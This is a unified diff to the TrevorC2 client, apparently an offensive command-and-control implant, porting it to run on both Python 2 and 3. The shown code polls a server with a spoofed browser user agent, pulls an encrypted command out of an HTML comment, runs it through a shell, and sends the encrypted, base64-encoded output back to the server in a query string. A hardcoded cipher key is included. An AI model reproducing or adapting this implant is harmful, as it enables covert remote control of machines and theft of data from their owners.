@@ -35,7 +35,13 @@ CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
 # DO NOT CHANGE BELOW THIS LINE
 
 
-import urllib2
+# python 2/3 compatibility, need to move this to python-requests in future
+try: 
+    import urllib2 as urllib
+    py = "2"
+except: 
+    import urllib.request, urllib.parse, urllib.error
+    py = "3"
 import random
 import base64
 import time
@@ -95,26 +101,44 @@ while 1:
     try:
         time.sleep(random_interval(time_interval1, time_interval2))
         # request with specific user agent
-        req = urllib2.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-        html = urllib2.urlopen(req).read()
+        if py == "3":
+            req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            html = urllib.request.urlopen(req).read().decode('utf-8')
+        else:
+            req = urllib.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            html = urllib.urlopen(req).read().decode('utf-8')
+
         # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
         parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
-        parse = cipher.decrypt(parse.decode())
+        parse = cipher.decrypt(parse)
         if parse == "nothing": pass
         else:
             # execute our parsed command
             proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout_value = proc.communicate()[0]
-            stdout_value = cipher.encrypt(stdout_value.encode())
-            stdout_value = base64.b64encode(stdout_value)
+            stdout_value = cipher.encrypt(stdout_value).encode('utf-8')
+            stdout_value = base64.b64encode(stdout_value).decode('utf-8')
+
             # pipe out stdout and base64 encode it then request via a query string parameter
-            req = urllib2.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            html = urllib2.urlopen(req).read()
+            if py == "3":
+                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                html = urllib.request.urlopen(req).read()
+
+            else:
+                req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                html = urllib.urlopen(req).read()
+
             # sleep random interval and let cleanup on server side
             time.sleep(random_interval(time_interval1, time_interval2))
 
     # handle exceptions and pass if the server is unavailable, but keep going
-    except urllib2.URLError: pass
+    except Exception as error:
+        # if we can't communicate, just pass
+        if "Connection refused" in str(error):
+            pass
+        else:
+            print("[!] Something went wrong, printing error: " + str(error))
+
     except KeyboardInterrupt:
         print ("\n[!] Exiting TrevorC2 Client...")
         sys.exit()
